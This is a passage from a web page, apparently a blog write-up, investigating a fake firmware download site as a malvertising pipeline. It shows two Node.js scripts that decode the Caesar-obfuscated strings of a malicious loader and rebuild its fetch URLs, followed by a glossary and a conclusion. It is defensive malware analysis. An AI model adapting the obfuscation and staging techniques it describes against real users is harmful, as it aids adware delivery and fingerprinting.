+<span data-line><span>const rawVal = m[3];</span></span>
+<span data-line> </span>
+<span data-line><span>if (!(key in mapping)) mapping[key] = Number(rawVal);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (Object.keys(mapping).length === 0) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: No simple key:string/number pairs found. The file format may differ.');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 3) Caesar-like decode function (mirrors the one in the obfuscated script)</span></span>
+<span data-line> </span>
+<span data-line><span>// It rotates letters by -12 (i.e., (c - 65 + 26 - 12) % 26)</span></span>
+<span data-line> </span>
+<span data-line><span>function decodeCaesar(str) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (typeof str !== 'string') return str;</span></span>
+<span data-line> </span>
+<span data-line><span>return str</span></span>
+<span data-line> </span>
+<span data-line><span>.split('')</span></span>
+<span data-line> </span>
+<span data-line><span>.map((s) => {</span></span>
+<span data-line> </span>
+<span data-line><span>const c = s.charCodeAt(0);</span></span>
+<span data-line> </span>
+<span data-line><span>if (c >= 65 &amp;&amp; c &lt;= 90) return String.fromCharCode(((c - 65 + 26 - 12) % 26) + 65);</span></span>
+<span data-line> </span>
+<span data-line><span>if (c >= 97 &amp;&amp; c &lt;= 122) return String.fromCharCode(((c - 97 + 26 - 12) % 26) + 97);</span></span>
+<span data-line> </span>
+<span data-line><span>return s;</span></span>
+<span data-line> </span>
+<span data-line><span>})</span></span>
+<span data-line> </span>
+<span data-line><span>.join('');</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 4) Decode values</span></span>
+<span data-line> </span>
+<span data-line><span>const decoded = {};</span></span>
+<span data-line> </span>
+<span data-line><span>for (const k of Object.keys(mapping)) {</span></span>
+<span data-line> </span>
+<span data-line><span>const v = mapping[k];</span></span>
+<span data-line> </span>
+<span data-line><span>decoded[k] = typeof v === 'string' ? decodeCaesar(v) : v;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 5) Collect URL-like decoded values</span></span>
+<span data-line> </span>
+<span data-line><span>const urlCandidates = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const [k, v] of Object.entries(decoded)) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (typeof v === 'string') {</span></span>
+<span data-line> </span>
+<span data-line><span>// detect proto-like or domain-like strings</span></span>
+<span data-line> </span>
+<span data-line><span>if (v.match(/^[a-z][a-z0-9+\-.]*:\/\//i) || v.match(/\.[a-z]{2,6}(?:[:\/]|$)/i) || v.match(/\/[A-Za-z0-9._\-]{4,}/)) {</span></span>
+<span data-line> </span>
+<span data-line><span>urlCandidates.push({ key: k, value: v });</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 6) Try reconstructing fetch URL patterns used in the loader</span></span>
+<span data-line> </span>
+<span data-line><span>// The loader used something like `${t[x.ar]}${t[x.Xr]}${t[x.Jr]}`</span></span>
+<span data-line> </span>
+<span data-line><span>// We'll try combinations of likely keys</span></span>
+<span data-line> </span>
+<span data-line><span>const combosToTry = [</span></span>
+<span data-line> </span>
+<span data-line><span>['ar', 'Xr', 'Jr'],</span></span>
+<span data-line> </span>
+<span data-line><span>['E', 'i', 'P'],</span></span>
+<span data-line> </span>
+<span data-line><span>['E', 'P', 'f'],</span></span>
+<span data-line> </span>
+<span data-line><span>['E', 'P', 'P'],</span></span>
+<span data-line> </span>
+<span data-line><span>['E', 'i', 'f'],</span></span>
+<span data-line> </span>
+<span data-line><span>['e', 'i', 'P'],</span></span>
+<span data-line> </span>
+<span data-line><span>['ar', 'Xr', 'Eq'], // extra attempts</span></span>
+<span data-line> </span>
+<span data-line><span>];</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const reconstructed = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const combo of combosToTry) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (decoded[combo[0]] &amp;&amp; decoded[combo[1]] &amp;&amp; decoded[combo[2]]) {</span></span>
+<span data-line> </span>
+<span data-line><span>reconstructed.push({</span></span>
+<span data-line> </span>
+<span data-line><span>combo: combo.join('+'),</span></span>
+<span data-line> </span>
+<span data-line><span>url: `${decoded[combo[0]]}${decoded[combo[1]]}${decoded[combo[2]]}`,</span></span>
+<span data-line> </span>
+<span data-line><span>});</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 7) Also search the whole decoded mapping values for 'tffbe' (looks like obf protocol) and convert if found.</span></span>
+<span data-line> </span>
+<span data-line><span>// The decodeCaesar should have already turned 'tffbe' into something readable by now</span></span>
+<span data-line> </span>
+<span data-line><span>const tffbeHits = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const [k, v] of Object.entries(decoded)) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (typeof v === 'string' &amp;&amp; v.match(/^[a-z]{3,6}:\/\//i)) {</span></span>
+<span data-line> </span>
+<span data-line><span>tffbeHits.push({ key: k, value: v });</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// 8) Print results </span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Decoded mapping (sample) ===');</span></span>
+<span data-line> </span>
+<span data-line><span>const allKeys = Object.keys(decoded).sort();</span></span>
+<span data-line> </span>
+<span data-line><span>for (const k of allKeys) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log(`${k}: ${decoded[k]}`);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>console.log(`\n(total decoded keys: ${allKeys.length})`);</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (urlCandidates.length) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== URL-like decoded values ===');</span></span>
+<span data-line> </span>
+<span data-line><span>urlCandidates.forEach((u) => console.log(`${u.key}: ${u.value}`));</span></span>
+<span data-line> </span>
+<span data-line><span>} else {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\nNo obvious URL-like decoded values found in simple pairs.');</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (reconstructed.length) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Best-effort reconstructed fetch URL(s) ===');</span></span>
+<span data-line> </span>
+<span data-line><span>reconstructed.forEach((r) => console.log(`${r.combo} -> ${r.url}`));</span></span>
+<span data-line> </span>
+<span data-line><span>} else {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\nNo fetch URL reconstructed from the tried key combos. You can add more combos in combosToTry.');</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (tffbeHits.length) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Protocol-like hits (decoded) ===');</span></span>
+<span data-line> </span>
+<span data-line><span>tffbeHits.forEach((h) => console.log(`${h.key}: ${h.value}`));</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Notes ===');</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('- This extractor only captures simple key:string and key:number pairs from the mapping object.');</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('- The original script used getters to decode strings on-demand; this static extractor decodes the raw stored strings.');</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('- Functions, arrays, and computed values inside the mapping are intentionally NOT executed for safety.');</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\nDone.');</span></span></code></pre></figure>
+<p><code>reconstruct_urls.js:</code></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="JavaScript" data-theme="github-light github-dark"><code data-language="JavaScript" data-theme="github-light github-dark" style="display:grid;"><span data-line> </span>
+<span data-line><span>// This thing does pretty muich the same as the other script but just outputs it cleaner because chat is way better at JavaScript then me lol</span></span>
+<span data-line> </span>
+<span data-line> </span>
+<span data-line><span>// - Finds decoded base domains (http/https) and decoded path-like values (starting with / or containing &quot;/contents/&quot;)</span></span>
+<span data-line> </span>
+<span data-line><span>// - Outputs combinations (domain + path) and other sensible variants</span></span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const fs = require('fs');</span></span>
+<span data-line> </span>
+<span data-line><span>const path = require('path');</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const INFILE = path.join(__dirname, 'mw.min.js');</span></span>
+<span data-line> </span>
+<span data-line><span>if (!fs.existsSync(INFILE)) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: mw.min.js not found in current directory.');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const raw = fs.readFileSync(INFILE, 'utf8');</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// locate Object.entries({...}) block as before</span></span>
+<span data-line> </span>
+<span data-line><span>const startMarker = 'Object.entries(';</span></span>
+<span data-line> </span>
+<span data-line><span>let idx = raw.indexOf(startMarker);</span></span>
+<span data-line> </span>
+<span data-line><span>if (idx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not find &quot;Object.entries(&quot; in mw.min.js');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>idx = raw.indexOf('{', idx + startMarker.length);</span></span>
+<span data-line> </span>
+<span data-line><span>if (idx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not find opening &quot;{&quot; after Object.entries(');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>let depth = 0;</span></span>
+<span data-line> </span>
+<span data-line><span>let endIdx = -1;</span></span>
+<span data-line> </span>
+<span data-line><span>for (let i = idx; i &lt; raw.length; i++) {</span></span>
+<span data-line> </span>
+<span data-line><span>const ch = raw[i];</span></span>
+<span data-line> </span>
+<span data-line><span>if (ch === '{') depth++;</span></span>
+<span data-line> </span>
+<span data-line><span>else if (ch === '}') {</span></span>
+<span data-line> </span>
+<span data-line><span>depth--;</span></span>
+<span data-line> </span>
+<span data-line><span>if (depth === 0) { endIdx = i; break; }</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>if (endIdx === -1) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: Could not locate end of the mapping object.');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>const objText = raw.slice(idx, endIdx + 1);</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// regexes for primitive key: 'string' and &quot;string&quot; and numbers</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexSingle = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*'((?:\\'|[^'])*)'/g;</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexDouble = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*&quot;((?:\\&quot;|[^&quot;])*)&quot;/g;</span></span>
+<span data-line> </span>
+<span data-line><span>const kvRegexNum = /(?:([&quot;']?)([A-Za-z0-9_$]+)\1)\s*:\s*([0-9]+(?:\.[0-9]+)?)/g;</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const mapping = {};</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// extract single-quoted strings</span></span>
+<span data-line> </span>
+<span data-line><span>let m;</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexSingle.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
+<span data-line><span>const rawVal = m[3].replace(/\\'/g, &quot;'&quot;);</span></span>
+<span data-line> </span>
+<span data-line><span>mapping[key] = rawVal;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>// double-quoted</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexDouble.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
+<span data-line><span>const rawVal = m[3].replace(/\\&quot;/g, '&quot;');</span></span>
+<span data-line> </span>
+<span data-line><span>mapping[key] = rawVal;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>// numbers</span></span>
+<span data-line> </span>
+<span data-line><span>while ((m = kvRegexNum.exec(objText)) !== null) {</span></span>
+<span data-line> </span>
+<span data-line><span>const key = m[2];</span></span>
+<span data-line> </span>
+<span data-line><span>const rawVal = m[3];</span></span>
+<span data-line> </span>
+<span data-line><span>if (!(key in mapping)) mapping[key] = Number(rawVal);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (Object.keys(mapping).length === 0) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.error('ERROR: No simple key:string/number pairs found. The file may be in a different format.');</span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(1);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// Caesar-like decode function (same shift seen in the original)</span></span>
+<span data-line> </span>
+<span data-line><span>function decodeCaesar(str) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (typeof str !== 'string') return str;</span></span>
+<span data-line> </span>
+<span data-line><span>return str</span></span>
+<span data-line> </span>
+<span data-line><span>.split('')</span></span>
+<span data-line> </span>
+<span data-line><span>.map((s) => {</span></span>
+<span data-line> </span>
+<span data-line><span>const c = s.charCodeAt(0);</span></span>
+<span data-line> </span>
+<span data-line><span>if (c >= 65 &amp;&amp; c &lt;= 90) return String.fromCharCode(((c - 65 + 26 - 12) % 26) + 65);</span></span>
+<span data-line> </span>
+<span data-line><span>if (c >= 97 &amp;&amp; c &lt;= 122) return String.fromCharCode(((c - 97 + 26 - 12) % 26) + 97);</span></span>
+<span data-line> </span>
+<span data-line><span>return s;</span></span>
+<span data-line> </span>
+<span data-line><span>})</span></span>
+<span data-line> </span>
+<span data-line><span>.join('');</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// decode mapping</span></span>
+<span data-line> </span>
+<span data-line><span>const decoded = {};</span></span>
+<span data-line> </span>
+<span data-line><span>for (const k of Object.keys(mapping)) {</span></span>
+<span data-line> </span>
+<span data-line><span>const v = mapping[k];</span></span>
+<span data-line> </span>
+<span data-line><span>decoded[k] = (typeof v === 'string') ? decodeCaesar(v) : v;</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// collect domains and path-like strings</span></span>
+<span data-line> </span>
+<span data-line><span>const domains = [];</span></span>
+<span data-line> </span>
+<span data-line><span>const paths = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const [k, v] of Object.entries(decoded)) {</span></span>
+<span data-line> </span>
+<span data-line><span>if (typeof v !== 'string') continue;</span></span>
+<span data-line> </span>
+<span data-line><span>// domain-like: begins with http/https</span></span>
+<span data-line> </span>
+<span data-line><span>if (v.match(/^[a-z][a-z0-9+\-.]*:\/\//i)) {</span></span>
+<span data-line> </span>
+<span data-line><span>domains.push({ key: k, value: v });</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>// path-like: begins with / or contains /contents/</span></span>
+<span data-line> </span>
+<span data-line><span>if (v.startsWith('/') || v.includes('/contents/') || v.match(/\/[A-Za-z0-9._\-]{4,}/)) {</span></span>
+<span data-line> </span>
+<span data-line><span>// skip domains that are mistakenly captured as paths</span></span>
+<span data-line> </span>
+<span data-line><span>if (!v.match(/^[a-z][a-z0-9+\-.]*:\/\//i)) {</span></span>
+<span data-line> </span>
+<span data-line><span>paths.push({ key: k, value: v });</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// Deduplicate helpers</span></span>
+<span data-line> </span>
+<span data-line><span>const uniq = (arr, accessor = x => x) => {</span></span>
+<span data-line> </span>
+<span data-line><span>const seen = new Set();</span></span>
+<span data-line> </span>
+<span data-line><span>const out = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const it of arr) {</span></span>
+<span data-line> </span>
+<span data-line><span>const id = accessor(it);</span></span>
+<span data-line> </span>
+<span data-line><span>if (!seen.has(id)) { seen.add(id); out.push(it); }</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>return out;</span></span>
+<span data-line> </span>
+<span data-line><span>};</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>const uniqDomains = uniq(domains, d => d.value);</span></span>
+<span data-line> </span>
+<span data-line><span>const uniqPaths = uniq(paths, p => p.value);</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// Build combinations</span></span>
+<span data-line> </span>
+<span data-line><span>const combos = [];</span></span>
+<span data-line> </span>
+<span data-line><span>for (const d of uniqDomains) {</span></span>
+<span data-line> </span>
+<span data-line><span>for (const p of uniqPaths) {</span></span>
+<span data-line> </span>
+<span data-line><span>// clean concatenation: ensure single slash</span></span>
+<span data-line> </span>
+<span data-line><span>let full1 = d.value.endsWith('/') ? d.value.slice(0, -1) + p.value : d.value + p.value;</span></span>
+<span data-line> </span>
+<span data-line><span>// Some code patterns omitted the protocol and/or trailing pieces; also create variant without protocol</span></span>
+<span data-line> </span>
+<span data-line><span>combos.push({</span></span>
+<span data-line> </span>
+<span data-line><span>domainKey: d.key,</span></span>
+<span data-line> </span>
+<span data-line><span>pathKey: p.key,</span></span>
+<span data-line> </span>
+<span data-line><span>url: full1</span></span>
+<span data-line> </span>
+<span data-line><span>});</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// variant: if domain had no trailing slash but path doesn't start with slash (rare), also generate with slash</span></span>
+<span data-line> </span>
+<span data-line><span>if (!p.value.startsWith('/')) {</span></span>
+<span data-line> </span>
+<span data-line><span>combos.push({</span></span>
+<span data-line> </span>
+<span data-line><span>domainKey: d.key,</span></span>
+<span data-line> </span>
+<span data-line><span>pathKey: p.key,</span></span>
+<span data-line> </span>
+<span data-line><span>url: d.value + '/' + p.value</span></span>
+<span data-line> </span>
+<span data-line><span>});</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// plain join with double path (some reconstructions in your earlier output showed domain + P + '/' + f)</span></span>
+<span data-line> </span>
+<span data-line><span>// create combos of two paths joined</span></span>
+<span data-line> </span>
+<span data-line><span>for (const p2 of uniqPaths) {</span></span>
+<span data-line> </span>
+<span data-line><span>combos.push({</span></span>
+<span data-line> </span>
+<span data-line><span>domainKey: d.key,</span></span>
+<span data-line> </span>
+<span data-line><span>pathKey: `${p.key}+${p2.key}`,</span></span>
+<span data-line> </span>
+<span data-line><span>url: full1 + (p2.value.startsWith('/') ? p2.value : '/' + p2.value)</span></span>
+<span data-line> </span>
+<span data-line><span>});</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// Also include domain-only entries and path-only entries for inspection</span></span>
+<span data-line> </span>
+<span data-line><span>const domainOnly = uniqDomains.map(d => ({ key: d.key, value: d.value }));</span></span>
+<span data-line> </span>
+<span data-line><span>const pathOnly = uniqPaths.map(p => ({ key: p.key, value: p.value }));</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>// Print results</span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Decoded domains ===');</span></span>
+<span data-line> </span>
+<span data-line><span>domainOnly.forEach(d => console.log(`${d.key}: ${d.value}`));</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>console.log('\n=== Decoded paths / resources ===');</span></span>
+<span data-line> </span>
+<span data-line><span>pathOnly.forEach(p => console.log(`${p.key}: ${p.value}`));</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>console.log(`\n=== Reconstructed URL combinations (best-effort) - ${combos.length} items (showing up to 200) ===`);</span></span>
+<span data-line> </span>
+<span data-line><span>combos.slice(0, 200).forEach(c => console.log(`${c.domainKey}+${c.pathKey} -> ${c.url}`));</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>if (combos.length > 200) {</span></span>
+<span data-line> </span>
+<span data-line><span>console.log(`\n(... ${combos.length - 200} more combinations not printed)`);</span></span>
+<span data-line> </span>
+<span data-line><span>}</span></span>
+<span data-line> </span>
+<span data-line><span>  </span></span>
+<span data-line> </span>
+<span data-line><span>process.exit(0);</span></span>
+<span data-line> </span></code></pre></figure>
+<h2 id="13--appendix-b--short-glossary--what-things-mean">13 — Appendix B — Short glossary / what things mean<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#13--appendix-b--short-glossary--what-things-mean" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<ul>
+<li>
+<p><strong>Meta refresh:</strong> client-side HTML redirect via meta tag.</p>
+</li>
+<li>
+<p><strong>navigator.userAgentData.getHighEntropyValues:</strong> modern API to get detailed browser/OS/device info.</p>
+</li>
+<li>
+<p><strong>Service-worker (sw):</strong> browser background worker that can persist behavior and run when the site is not loaded. Abused by adware for persistence.</p>
+</li>
+<li>
+<p><strong>Malvertising:</strong> malicious advertising that either redirects users to scams or delivers payloads via ad networks.</p>
+</li>
+<li>
+<p><strong>Drive-by:</strong> a web visit that causes malicious behavior without explicit user intent to download malware.</p>
+</li>
+</ul>
+<h2 id="14--final-conclusion">14 — Final conclusion<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#14--final-conclusion" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>The <code>gofirmware.com</code> “firmware” download link is a façade. The real activity is a malvertising/adware pipeline that fingerprints visitors, consults server-side routing logic (so victims see conditional behavior), and pulls staged resources from a network of obscure domains. No legitimate firmware was found. Treat the link and associated domains as malicious, block them, and analyze any dynamic behavior only in a controlled sandbox/VM.</p></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc desktop-only"><button type="button" class="toc-header" aria-controls="toc-0" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-1" class="toc-content overflow"><li class="depth-0"><a href="#comprehensive-technical-write-up--investigation-of-httpsgofirmwarecomdownloadspxie-8880-firmware" data-for="comprehensive-technical-write-up--investigation-of-httpsgofirmwarecomdownloadspxie-8880-firmware">Comprehensive technical write-up — investigation of https://gofirmware.com/downloads/pxie-8880-firmware</a></li><li class="depth-0"><a href="#executive-summary" data-for="executive-summary">Executive summary</a></li><li class="depth-0"><a href="#detailed-findings" data-for="detailed-findings">Detailed findings</a></li><li class="depth-1"><a href="#1--what-i-started-with" data-for="1--what-i-started-with">1 — What I started with</a></li><li class="depth-1"><a href="#2--environment-and-safety-posture" data-for="2--environment-and-safety-posture">2 — Environment and safety posture</a></li><li class="depth-1"><a href="#3--commands-i-ran" data-for="3--commands-i-ran">3 — Commands I ran</a></li><li class="depth-1"><a href="#4--what-the-initial-html-contained-static-observation" data-for="4--what-the-initial-html-contained-static-observation">4 — What the initial HTML contained (static observation)</a></li><li class="depth-1"><a 